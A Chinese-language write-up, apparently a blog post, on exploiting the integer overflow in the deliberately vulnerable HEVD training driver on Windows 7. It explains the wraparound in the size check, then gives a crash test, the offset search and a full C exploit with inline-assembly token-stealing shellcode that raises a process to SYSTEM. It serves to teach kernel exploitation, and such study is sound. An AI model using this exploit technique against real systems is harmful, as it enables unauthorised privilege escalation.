## 前言

窥探Ring0漏洞世界：整型溢出漏洞

本例中，整型溢出的问题出现在安全检验的地方，由于整型溢出导致错误的输入通过了安全检验，从而造成了栈溢出漏洞。

所谓整型溢出，有两种，上溢出和下溢出，一个整型能表示的范围是有限的，当超出范围，就会发生溢出，例如0xffffffff+4 =
3，0-4=0xfffffffc

整型溢出漏洞是由于对用户输入的不安全处理而导致不安全的数据通过安全检验从而导致其他漏洞。

实验环境：

•虚拟机：Windows 7 x86

•物理机：Windows 10 x64

•软件：IDA，Windbg，VS2022

# 漏洞分析

该漏洞的触发函数TriggerIntegerOverflow，操作码是：0x222027：

首先一开始就是一个初始化局部缓冲区的操作：![](https://image.3001.net/images/20220728/1658971253_62e1e475af3e38c9cc85d.png!small)

然后紧接着对用户输入的缓冲区进行了大小检测，如果大于缓冲区大小则打印信息退出函数，如果小于等于则进入下面的whlie循环：不断复制用户缓冲区到内核缓冲区，每次复制4字节，直到复制的内容出现魔数或者用户缓冲区长度复制完成为止。![](https://image.3001.net/images/20220728/1658971267_62e1e483d6989bfeae12f.png!small)

乍一看好像没啥问题，但仔细观察上面判断用户输入Size那一块代码：if(Size + 4 > 0x800)

对于4字节整数，当出现溢出的时候：

0xfffffffc + 4 = 0  
0xffffffff + 4 = 3

所以该处存在漏洞，有以下利用思路：通过给定Size参数一个超大的值，使得导致溢出，从而在后面while代码块进行复制的时候导致栈溢出，从而进行利用。

接下来看看源码：

    
    
    ///
    
    
    /// Trigger the Integer Overflow Vulnerability
    ///
    
    
    
    
    
    ///The pointer to user mode buffer
    ///Size of the user mode buffer
    /// NTSTATUS
    __declspec(safebuffers)
    NTSTATUS
    TriggerIntegerOverflow(
    _In_ PVOID UserBuffer,
    _In_ ULONG Size
    )
    {
    ULONG Count = 0;
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG BufferTerminator = 0xBAD0B0B0;
    ULONG KernelBuffer[BUFFER_SIZE] = { 0 };
    ULONG TerminatorSize = sizeof(BufferTerminator);
    
    PAGED_CODE();
    
    __try
    {
    //
    // Verify if the buffer resides in user mode
    //
    
    ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));
    
    DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
    DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
    DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
    DbgPrint("[+] KernelBuffer Size: 0x%zX\n", sizeof(KernelBuffer));
    
    #ifdef SECURE
    //
    // Secure Note: This is secure because the developer is not doing any arithmetic
    // on the user supplied value. Instead, the developer is subtracting the size of
    // ULONG i.e. 4 on x86 from the size of KernelBuffer. Hence, integer overflow will
    // not occur and this check will not fail
    //
    
    if (Size > (sizeof(KernelBuffer) - TerminatorSize))
    {
    DbgPrint("[-] Invalid UserBuffer Size: 0x%X\n", Size);
    
    Status = STATUS_INVALID_BUFFER_SIZE;
    return Status;
    }
    #else
    DbgPrint("[+] Triggering Integer Overflow (Arithmetic Overflow)\n");
    
    //
    // Vulnerability Note: This is a vanilla Integer Overflow vulnerability because if
    // 'Size' is 0xFFFFFFFF and we do an addition with size of ULONG i.e. 4 on x86, the
    // integer will wrap down and will finally cause this check to fail
    //
    
    if ((Size + TerminatorSize) > sizeof(KernelBuffer))
    {
    DbgPrint("[-] Invalid UserBuffer Size: 0x%X\n", Size);
    
    Status = STATUS_INVALID_BUFFER_SIZE;
    return Status;
    }
    #endif
    
    //
    // Perform the copy operation
    //
    
    while (Count < (Size / sizeof(ULONG)))
    {
    if (*(PULONG)UserBuffer != BufferTerminator)
    {
    KernelBuffer[Count] = *(PULONG)UserBuffer;
    UserBuffer = (PULONG)UserBuffer + 1;
    Count++;
    }
    else
    {
    break;
    }
    }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
    Status = GetExceptionCode();
    DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
    
    return Status;
    }

该漏洞的修复很简单，把判定条件从左边变到右边：if(Size > 0x800 - 4)，这样用户输入也就不会发生变化了。

# ​漏洞利用

利用思路：利用kali生成一个超长随机数组作为用户缓冲区输入，传入的Size给出一个会导致溢出的值，然后触发栈溢出，确定溢出点，填入跳转地址执行shellcode。

首先第一步：生成超长字符串：

┌──(selph㉿kali)-[~/桌面]  
└─$ ./pattern_create.rb -l 0x900  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8AAn0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8BBn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7

测试代码：

    
    
    #include
    #include
    
    const char* randomStr = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8BBn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8CCn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7";
    
    int main()
    {
    
    ULONG UserBufferSize = 0xffffffff;
    
    HANDLE hDevice = ::CreateFileW(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[ERROR]Open Device Error\r\n");
    system("pause");
    exit(1);
    }
    else {
    printf("[INFO]Device Handle: 0x%X\n", hDevice);
    }
    
    ULONG WriteRet = 0;
    DeviceIoControl(hDevice, 0x222027, (LPVOID)randomStr, UserBufferSize, NULL, 0, &WriteRet, NULL);
    
    system("pause");
    system("cmd.exe");
    
    return 0;
    }

预料之内的崩溃了，查看栈回溯：

    
    
    kd> k
    # ChildEBP RetAddr   
    00 9bcd2d74 83ef4083     nt!RtlpBreakWithStatusInstruction
    01 9bcd2dc4 83ef4b81     nt!KiBugCheckDebugBreak+0x1c
    02 9bcd3188 83ea341b     nt!KeBugCheck2+0x68b
    03 9bcd3210 83e563d8     nt!MmAccessFault+0x106
    
    04 9bcd3210 8d9f5733 (T) nt!KiTrap0E+0xdc
    
    05 9bcd3ad0 43367243 (T) HEVD!TriggerIntegerOverflow+0xd5 [C:\Users\selph\Desktop\HackSysExtremeVulnerableDriver-master\Driver\HEVD\Windows\IntegerOverflow.c @ 133]
    WARNING: Frame IP not in any known module. Following frames may be wrong.
    06 9bcd3adc 43307343     0x43367243

可以看到05号函数调用那里出现了WARNING，说是这个IP不是任何已知模块，实际上这就是咱们刚刚溢出覆盖返回地址的地方。

拿出kali查看一下这个值43367243的位置：

┌──(selph㉿kali)-[~/桌面]  
└─$ ./pattern_offset.rb -q 43367243 -l 0x9000  
[*] Exact match at offset 2088

位于2088字节处，通过溢出这么多字节，可控返回地址，接下来可以编写exp了。

# 编写exp：

注意：在覆盖完返回地址之后，把那个魔数跟在后面用来结束复制，不然大量像后面复制会导致进入某个异常处理函数而不是走返回地址返回（蓝屏了三次才发现问题所在....）。

    
    
    #include
    #include
    
    // Windows 7 SP1 x86 Offsets
    #define KTHREAD_OFFSET0x124 // nt!_KPCR.PcrbData.CurrentThread
    #define EPROCESS_OFFSET    0x050 // nt!_KTHREAD.ApcState.Process
    #define PID_OFFSET         0x0B4 // nt!_EPROCESS.UniqueProcessId
    #define FLINK_OFFSET       0x0B8 // nt!_EPROCESS.ActiveProcessLinks.Flink
    #define TOKEN_OFFSET       0x0F8 // nt!_EPROCESS.Token
    #define SYSTEM_PID         0x004 // SYSTEM Process PID
    
    VOID TokenStealingPayloadWin7() {
    // Importance of Kernel Recovery
    __asm {
    pushad
    
    ;获取当前进程EPROCESS
    xor eax, eax
    mov eax, fs: [eax + KTHREAD_OFFSET]
    mov eax, [eax + EPROCESS_OFFSET]
    mov ecx, eax
    
    ;搜索system进程EPROCESS
    mov edx, SYSTEM_PID
    SearchSystemPID:
    mov eax, [eax + FLINK_OFFSET]
    sub eax, FLINK_OFFSET
    cmp[eax + PID_OFFSET], edx
    jne SearchSystemPID
    
    token窃取
    mov edx, [eax + TOKEN_OFFSET]
    mov[ecx + TOKEN_OFFSET], edx
    
    ;环境还原+返回
    popad
    xor eax, eax
    add esp, 12
    pop ebp
    ret 8
    }
    }
    
    int main()
    {
    ULONG UserBufferSize = 2088+4+4;
    PVOID EopPayload = &ampTokenStealingPayloadWin7
    
    HANDLE hDevice = ::CreateFileW(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[ERROR]Open Device Error\r\n");
    system("pause");
    exit(1);
    }
    else {
    printf("[INFO]Device Handle: 0x%X\n", hDevice);
    }
    
    PULONG UserBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);
    if (!UserBuffer) {
    printf("[ERROR]Allocate ERROR");
    system("pause");
    
    exit(1);
    }
    else {
    printf("[INFO]Allocated Memory: 0x%p\n", UserBuffer);
    printf("[INFO]Allocation Size: 0x%X\n", UserBufferSize);
    }
    
    RtlFillMemory(UserBuffer, UserBufferSize, 0x41);
    
    PVOID MemoryAddress = (PVOID)(((ULONG)UserBuffer + UserBufferSize) - sizeof(ULONG)*2);
    *(PULONG)MemoryAddress = (ULONG)EopPayload;
    //0x0BAD0B0B0
    MemoryAddress = (PVOID)(((ULONG)UserBuffer + UserBufferSize) - sizeof(ULONG));
    *(PULONG)MemoryAddress = (ULONG)0x0BAD0B0B0;
    
    ULONG WriteRet = 0;
    DeviceIoControl(hDevice, 0x222027, (LPVOID)UserBuffer, 0xffffffff, NULL, 0, &WriteRet, NULL);
    
    HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer);
    UserBuffer = NULL;
    
    system("pause");
    system("cmd.exe");
    
    return 0;
    }

## 截图演示

![](https://image.3001.net/images/20220728/1658971282_62e1e492e669ddd303c85.png!small)

  

# 参考资料

•[1] FuzzySecurity | Windows ExploitDev: Part 14
https://www.fuzzysecurity.com/tutorials/expDev/18.html

•[2] [原创]HEVD学习笔记之整数溢出漏洞-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com
https://bbs.pediy.com/thread-270192.htm

•[3] Jcc — Jump if Condition Is Met (felixcloutier.com)
https://www.felixcloutier.com/x86/jcc

•[4] 整型溢出漏洞_ATFWUS的博客-CSDN博客_整形溢出漏洞https://blog.csdn.net/ATFWUS/article/details/104605336

